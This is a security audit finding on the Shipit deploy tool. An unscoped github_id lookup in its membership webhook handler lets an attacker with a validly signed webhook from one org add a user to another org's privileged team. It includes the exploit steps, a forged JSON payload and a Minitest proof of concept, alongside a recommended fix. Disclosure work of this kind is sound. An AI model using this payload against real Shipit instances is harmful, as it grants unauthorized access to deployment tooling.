### Title
Cross-organization team hijack via unscoped `github_id` lookup in `MembershipHandler` - ([File: app/models/shipit/webhooks/handlers/membership_handler.rb])

### Summary
`MembershipHandler#find_or_create_team!` looks up the target `Team` solely by `params.team.id` (`github_id`), with no check that `params.organization.login` matches the team's real `organization`. Because webhook signature verification (`WebhooksController#verify_signature`) only proves the payload was signed by *some* org the attacker controls (their own), an attacker who owns any org onboarded to Shipit can forge a `membership` webhook naming an arbitrary `team.id` belonging to a *different*, privileged organization and cause `team.add_member` to run, granting an attacker-chosen GitHub login membership in that privileged team.

### Finding Description
The claimed binding under audit is:
`Team#slug (after attack) == Team#slug (before attack)` — TRUE, because `find_or_create_by!`'s block only executes on row creation [1](#0-0) , so for a pre-existing `Team` row (matched by `github_id`), `team.github_team=` (which sets `name`/`slug`/`api_url`/`github_id`, see [2](#0-1) ) and `team.organization=` never run. This part of the audit's claim holds.

However, tracing the real reachable path shows the true break is a *different* binding that the question also names but which is not adequately mitigated: `params.organization.login (verified signer) == Team#organization (row being mutated)`. This equality is **never checked**. `find_or_create_team!` finds the target row purely via `github_id`:
```ruby
Team.find_or_create_by!(github_id: params.team.id) do |team| ... end
``` [1](#0-0) 

`WebhooksController#verify_signature` derives the HMAC key from `repository_owner`, which for a `membership` event falls back to `params.dig('organization', 'login')` [3](#0-2) . This only proves the request was signed with *that* organization's webhook secret — it says nothing about whether `team.id` in the body actually belongs to that organization. GitHub team IDs are globally unique but publicly observable/guessable integers; nothing in this code cross-validates them against the signing org.

Exploit flow:
1. Attacker legitimately configures/owns `attacker-org` on Shipit (a GitHub App install with a valid `webhook_secret` — matches the question's precondition of "verified under attacker's own org").
2. Attacker sends `POST /webhooks` with header `X-Github-Event: membership`, correctly HMAC-signed with `attacker-org`'s secret, and body:
   ```json
   {"action":"added","team":{"id":<victim_team.github_id>,"name":"x","slug":"x","url":"x"},
    "organization":{"login":"attacker-org"},"member":{"login":"attacker-controlled-user"}}
   ```
3. `check_if_ping`, `drop_unhandled_event`, `verify_signature` all pass (signature is valid for `attacker-org`).
4. `MembershipHandler#process` calls `find_or_create_team!`, which matches the existing privileged `Team` row by `github_id` alone [1](#0-0) . Identity fields (`slug`/`name`/`organization`) are untouched since the record already exists.
5. `team.add_member(member)` runs unconditionally [4](#0-3) , creating a `Membership` row linking the attacker-chosen user to the victim organization's `Team`, via `Team#add_member` [5](#0-4) .

Existing guards fail to stop this because: `verify_signature` authenticates the *sender org*, not the *target team's org*; `find_or_create_by!`'s create-only block was (mis)assumed to be the only place organization is validated, but it is never checked on the read/find path at all, and there's no unique/composite constraint or explicit `organization` comparison guarding `add_member`.

### Impact Explanation
This is a `Shipit.github_teams` authorization escalation (High severity per the provided scale): if the targeted `Team` row is one of the teams configured in `github.oauth.teams` (used by `Shipit.github_teams` for access gating, see [6](#0-5)  and enforced in controllers such as [7](#0-6) ), the attacker can grant an arbitrary GitHub login membership in that team without any legitimate GitHub org action, since `Membership` presence is what `User#authorized?`-style checks rely on. This is repeatable against any `Team` row whose numeric `github_id` the attacker knows or guesses, across any tenant/org configured in the same Shipit instance, as long as the attacker owns at least one onboarded org to obtain a valid signature.

### Likelihood Explanation
Preconditions: (1) attacker's own org is a configured/onboarded org in this Shipit instance (needed to legitimately sign webhooks — matches the audit's given precondition); (2) a target `Team` row already exists with a known `github_id` (GitHub team IDs are visible via the GitHub API/UI to anyone who can see the team, or are otherwise discoverable); (3) that team is used for privileged access via `Shipit.github_teams`. No Shipit session, API token, or secret is required beyond the attacker's own legitimately obtained webhook secret. Cost is low (a single crafted HTTP POST), and the attack is repeatable for any known `team.id`.

### Recommendation
In `MembershipHandler#find_or_create_team!`, scope the lookup by both `github_id` and the verified `organization` (e.g., `Team.find_or_create_by!(github_id: params.team.id, organization: params.organization.login)`), and additionally verify that `params.organization.login` matches the resolved `repository_owner`/signing org used in `verify_signature` before calling `team.add_member`/`team.members.delete`. Reject the webhook (or no-op) if an existing `Team` with that `github_id` belongs to a different `organization` than the one that signed the request.

### Proof of Concept
Minitest plan (extends `test/controllers/webhooks_controller_test.rb`):
```ruby
test ":membership forged from a foreign org adds a member to another org's privileged team" do
  victim_team = shipit_teams(:shopify_developers) # organization: 'shopify', privileged team
  original_slug = victim_team.slug
  original_org  = victim_team.organization

  # Simulate a validly-signed webhook from an org the attacker legitimately controls
  Shipit.stubs(:github).with(organization: 'attacker-org').returns(
    stub(verify_webhook_signature: true)
  )

  @request.headers['X-Github-Event'] = 'membership'
  payload = {
    action: 'added',
    team: { id: victim_team.github_id, name: 'forged', slug: 'forged', url: 'http://evil.example' },
    organization: { login: 'attacker-org' }, # signer org != victim_team.organization
    member: { login: 'attacker-controlled-user' }
  }

  assert_difference -> { Membership.count }, 1 do
    post :create, body: payload.to_json, as: :json
    assert_response :ok
  end

  victim_team.reload
  # Identity fields unchanged (confirms the narrower claim)
  assert_equal original_slug, victim_team.slug
  assert_equal original_org, victim_team.organization
  # But authorization row was created for an org that never signed for this team
  assert victim_team.members.exists?(login: 'attacker-controlled-user')
end
```
This proves: `Team#slug`/`#organization` remain the legitimate values (as the audit claims), while a `Membership` granting an attacker-chosen user access to the victim's privileged team is created purely because `find_or_create_team!` matches on `github_id` without validating it against the webhook's verified signing organization.

### Citations

**File:** app/models/shipit/webhooks/handlers/membership_handler.rb (L22-28)
```ruby
        def process
          team = find_or_create_team!
          member = User.find_or_create_by_login!(params.member.login)

          case params.action
          when 'added'
            team.add_member(member)
```

**File:** app/models/shipit/webhooks/handlers/membership_handler.rb (L38-43)
```ruby
        def find_or_create_team!
          Team.find_or_create_by!(github_id: params.team.id) do |team|
            team.github_team = params.team
            team.organization = params.organization.login
          end
        end
```

**File:** app/models/shipit/team.rb (L41-43)
```ruby
    def add_member(member)
      members.append(member) unless members.include?(member)
    end
```

**File:** app/models/shipit/team.rb (L53-58)
```ruby
    def github_team=(github_team)
      self.name = github_team.name
      self.slug = github_team.slug
      self.api_url = github_team.url
      self.github_id = github_team.id
    end
```

**File:** app/controllers/shipit/webhooks_controller.rb (L59-62)
```ruby
    def repository_owner
      # Fallback to the organization sub-object if repository isn't included in the payload
      params.dig('repository', 'owner', 'login') || params.dig('organization', 'login')
    end
```

**File:** lib/shipit.rb (L256-258)
```ruby
  def github_teams
    @github_teams ||= github.oauth_teams.map { |t| Team.find_or_create_by_handle(t) }
  end
```

**File:** test/controllers/repositories_controller_test.rb (L19-28)
```ruby
    test "current_user must be a member of at least a Shipit.github_teams" do
      session[:user_id] = shipit_users(:bob).id
      Shipit.stubs(:github_teams).returns([shipit_teams(:cyclimse_cooks), shipit_teams(:shopify_developers)])
      get :index
      assert_response :forbidden
      assert_equal(
        'You must be a member of cyclimse/cooks or shopify/developers to access this application.',
        response.body
      )
    end
```
